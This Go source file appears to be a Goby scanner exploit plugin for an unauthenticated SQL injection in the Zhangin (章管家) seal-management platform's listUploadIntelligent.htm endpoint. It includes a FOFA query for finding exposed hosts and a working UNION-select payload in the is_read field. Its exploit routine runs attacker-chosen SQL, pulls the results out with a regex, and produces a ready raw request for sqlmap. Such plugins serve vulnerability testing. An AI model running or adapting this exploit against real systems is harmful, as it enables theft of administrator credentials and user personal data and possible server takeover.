package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Zhangin-Seal-Smart-MP /listUploadIntelligent.htm SQL Injection Vulnerability",
    "Description": "<p>Chapter Butler is a seal intelligent management solution integrating intelligent seal management system, APP and intelligent terminal equipment, which is launched by Shanghai Jianye Information Technology Co., Ltd. The product aims to solve the difficulties and pain points of the use and management of corporate seals through intelligent means, improve the safety and efficiency of seal management, and provide strong support for enterprise seal management. </p><p>listUploadIntelligent.htm In addition to exploiting the SQL injection vulnerability to obtain information in the database (e.g., administrator background password, site user personal information), an unauthenticated remote attacker can even write a Trojan to the server in the case of high privilege to further obtain server system permissions.</p>",
    "Product": "Zhangin-Seal-Smart-MP",
    "Homepage": "https://www.zhangin.com/index.html",
    "DisclosureDate": "2024-08-13",
    "PostTime": "2024-10-24",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "body=\"章管家\" && body=\"/resources/login_password\"",
    "GobyQuery": "body=\"章管家\" && body=\"/resources/login_password\"",
    "Level": "1",
    "Impact": "<p>listUploadIntelligent.htm In addition to exploiting the SQL injection vulnerability to obtain information in the database (e.g., administrator background password, site user personal information), an unauthenticated remote attacker can even write a Trojan to the server in the case of high privilege to further obtain server system permissions.</p>",
    "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/141106455"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "db_name,db_version,user_name",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "SELECT VERSION()",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "章管家 /listUploadIntelligent.htm SQL 注入漏洞",
            "Product": "章管家-印章智慧管理平台",
            "Description": "<p>章管家是一款集智能印章管理系统、APP、智能终端设备于一体的印章智慧管理解决方案，由上海建业信息科技股份有限公司推出。该产品旨在通过智能化手段，解决企业实体印章使用与管理的难点与痛点，提升印章管理的安全性和效率，为企业印章管理提供了强有力的支持。<br></p><p>章管家 listUploadIntelligent.htm&nbsp;接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "Recommendation": "<p>1、部署Web应用防火墙，对数据库操作进行监控。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>章管家 listUploadIntelligent.htm&nbsp;接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Zhangin-Seal-Smart-MP /listUploadIntelligent.htm SQL Injection Vulnerability",
            "Product": "Zhangin-Seal-Smart-MP",
            "Description": "<p>Chapter Butler is a seal intelligent management solution integrating intelligent seal management system, APP and intelligent terminal equipment, which is launched by Shanghai Jianye Information Technology Co., Ltd. The product aims to solve the difficulties and pain points of the use and management of corporate seals through intelligent means, improve the safety and efficiency of seal management, and provide strong support for enterprise seal management.&nbsp;</p><p>listUploadIntelligent.htm In addition to exploiting the SQL injection vulnerability to obtain information in the database (e.g., administrator background password, site user personal information), an unauthenticated remote attacker can even write a Trojan to the server in the case of high privilege to further obtain server system permissions.<br></p>",
            "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>listUploadIntelligent.htm In addition to exploiting the SQL injection vulnerability to obtain information in the database (e.g., administrator background password, site user personal information), an unauthenticated remote attacker can even write a Trojan to the server in the case of high privilege to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9962"
}`
	setSqlPayloadHashasfbudtgiasftiastfcugtiasdyfgtysavfecbqwtgykfcgqwteybcjqwwyhudecqtduxycqadw := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, sqlUrl string, head map[string]string) (*httpclient.HttpResponse, error) {
			//对sql进行url编码
			sql = url.QueryEscape(sql)
			postRequest := httpclient.NewPostRequestConfig(sqlUrl)
			postRequest.Timeout = 15
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
			postRequest.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			postRequest.Data = "person_id=1&unit_id=1&pageNo=1&is_read=-1%20union%20select%20(" + sql + "),2,3,4,5,6,7,8,9,10,11,12--"
			for headName, headValue := range head {
				postRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, postRequest)
		}
		urlget := "/app/message/listUploadIntelligent.htm?token=dingtalk_token"

		resp, err = setGetRequest(hostInfo, urlget, map[string]string{})
		if err != nil || resp.StatusCode != 200 {
			return resp, "", err
		}
		//配置漏洞存在的路径
		vulurl = "/app/message/listUploadIntelligent.htm?token=dingtalk_token"

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := "d0aa518d4d3bfc721aa0b8ab4ef32269"

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := `SELECT MD5("3645")`

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			regular := `is_read":((.|\n)*?),`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashasfbudtgiasftiastfcugtiasdyfgtysavfecbqwtgykfcgqwteybcjqwwyhudecqtduxycqadw
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			if output, err := makeRegular(resp.RawBody, regular); err != nil || !strings.Contains(output, content) {
				return false
			}
			if err != nil {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			// expResult.HostInfo.HostInfo
			sqlpoint := `POST /app/message/listUploadIntelligent.htm?token=dingtalk_token HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded
Connection: close
 
person_id=1&unit_id=1&pageNo=1&is_read=-1 union select (select md5('123')),2,3,4,5,6,7,8,9,10,11,12 --`

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			regular := `is_read":((.|\n)*?),`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashasfbudtgiasftiastfcugtiasdyfgtysavfecbqwtgykfcgqwteybcjqwwyhudecqtduxycqadw
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "custom" || attacktype == "default" {
				sql := ""
				if attacktype == "custom" {
					sql = goutils.B2S(ss.Params["custom"])
				} else {
					way := goutils.B2S(ss.Params["default"])
					if way == "db_name" {
						sql = "SELECT database()"
					} else if way == "db_version" {
						sql = "SELECT version()"
					} else if way == "user_name" {
						sql = "SELECT user()"
					}
				}
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
					return expResult
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
